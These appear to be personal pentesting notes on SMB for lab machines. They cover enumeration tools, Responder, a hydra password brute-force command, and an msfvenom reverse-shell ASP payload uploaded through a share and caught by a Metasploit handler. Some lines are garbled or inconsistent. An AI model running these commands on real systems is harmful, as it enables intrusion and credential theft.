## SMB
Server Message Block

### Info
- can be enumerated with nmap scripts

### Versions
- **SMB1**: Very old, not secure and should be disabled. 
  - Attacks: (EternalBlue, EternalRomance, EternalSynergy, EternalChampion, EternalRock, SambaCry, WannaCry, Petya, NotPetya, etc.)

- **SMB2**: Introduced in Windows Vista and Windows Server 2008. Less chatty. Guest access is disabled by default.
- **SMB3**: Introduced in Windows 8 and Windows Server 2012. Most secure. Uses AES encryption. Need User authentication.

### Ports And Infos:
- **Port 139**: SMB1, NetBIOS Session Service
  - SMB1 Hostname must be provided \\host1\files
- **Port 445**: SMB1 and SMB2 Microsoft-DS \\ Active Directory, Windows shares, etc.
  - can use IP address \\192.193.1.231\files

### Enumerated by tools:
- **enum4linux**: Enumerates SMB shares on Windows and Linux systems.
- Nmap scripts: smb-enum-shares, smb-enum-users, smb-os-discovery, smb-security-mode, smb-vuln-*, etc.
- smbclient: Command-line tool to access SMB shares.
- rpcclient: Command-line tool to access Windows RPC services.

### Common Shares:
- **IPC$**: Inter-Process Communication share.
- **C$**: Drive C. of the remote host
- **Admin$**: Access to the Windows folder.

if ipc is available you can do for example: eternalblue

### To Try in Pentesting:
- Can i acces SMB as guest?
- Can I bruteforce usernames/ passwords
- Can I read/write to shares?
- Can I access my written file to execute shells?

### SMB Responder: 

-I choose network interface (In the context of Responder, 

```sh
git clone https://github.com/lgandx/Responder
```
Verify that the Responder.conf is set to listen for SMB requests.

edit resolver conf if necessary

```sh
cat Responder.conf
```
```
sudo python3 Responder.py -I tun0

Specifying -I tun0 means that Responder will listen for network requests coming through the tun0 interface. 
This could be useful if you're running Responder on a system that's connected to a VPN, 
and you want Responder to only interact with network traffic that's coming over the VPN connection.)

```
server is now listening


### SMBClient

#### Options
-L : List available shares on the target.

-U : Login identity to use.

Onfound username:
$ = Signalised t

#### Installation
```sh
sudo apt install smbclient
```


#### Commands
```sh 
get "flag.txt" #to get the flag
```

#### Examples
```sh
smbclient -L 10.129.206.31 -U Administrator

smbclient \\\\10.129.206.31\\ADMIN$ -U Administrator #with folder ADMIN$
smbclient \\\\10.129.206.31\\AC$ -U Administrator #with folder C
```

### RPC Client
Can also use as cli for smb

opens a shell
```shell
queryuser 500 #administrator infos
queryuser 1000 #first User on machine
```

### Bruteforce access

```shell
#this can take long
hydra -l IEUSER -P /usr/share/wordlists/rockyou.txt smb #bruteforce smb
```

### Nmap with SMB Username and password
This delivers more details in enumeration
```shell
nmap -script smb-enum* --script-args smbusername=IEUSER,smbpass=Password$ -p445 192.254.1.102
```

### Tipps in pentesting
- If folder is webfolder maybe possible to put files there via some smb user
- typically somethink like **wwwroot**

## Reverse Shell over SMB:
1. Create reverse shell with msfvenom
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.254.1.229 LPORT=4444 -f asp > shell.asp
```
2. That creates an asp shell script which can be
3. Accepting the shell with metasploit:
```shell
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.254.1.228; set lport 4444; run -j"
```
4. Put  the shell.asp in webfolder of the smb share.
5. Than open it in browser to execute the shell.
